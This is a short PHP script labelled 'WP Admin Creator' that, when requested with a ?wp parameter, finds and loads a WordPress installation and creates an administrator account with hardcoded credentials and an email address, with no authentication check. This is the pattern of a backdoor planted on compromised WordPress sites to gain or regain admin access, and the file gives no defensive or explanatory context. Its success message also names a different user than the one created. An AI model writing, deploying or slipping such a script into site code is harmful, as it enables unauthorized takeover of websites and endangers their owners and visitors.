<?php
// === WP Admin Creator

$cwd = __DIR__; // Get current directory
echo "<p>Current directory: $cwd</p>"; // Debugging line

if (isset($_GET['wp'])) {
    $wppath = $cwd;
    // Debugging: echo the search path
    echo "<p>Searching for wp-load.php in: $wppath</p>";

    // Traverse up the directory tree until wp-load.php is found
    while ($wppath !== '/' && !file_exists("$wppath/wp-load.php")) {
        $wppath = dirname($wppath);
        // Debugging: echo every directory it's checking
        echo "<p>Checking directory: $wppath</p>";
    }

    if (file_exists("$wppath/wp-load.php")) {
        require_once("$wppath/wp-load.php");

        // Define user credentials
        $user = 'nadminnadmin';
        $pass = 'nadminnadmin';
        $mail = 'kroz.krozz12@gmail.com';

        // Check if the user exists
        if (!username_exists($user) && !email_exists($mail)) {
            $uid = wp_create_user($user, $pass, $mail);
            $wp_user = new WP_User($uid);
            $wp_user->set_role('administrator');
            echo "<p style='color:green;'>✅ WP Admin 'nova' created successfully</p>";
        } else {
            echo "<p style='color:orange;'>⚠️ User or email already exists</p>";
        }
    } else {
        echo "<p style='color:red;'>❌ wp-load.php not found in the expected directory. Check your WordPress installation path.</p>";
    }
} else {
    echo "<p>Append <code>?wp</code> to the URL to trigger admin creation.</p>";
}
?>
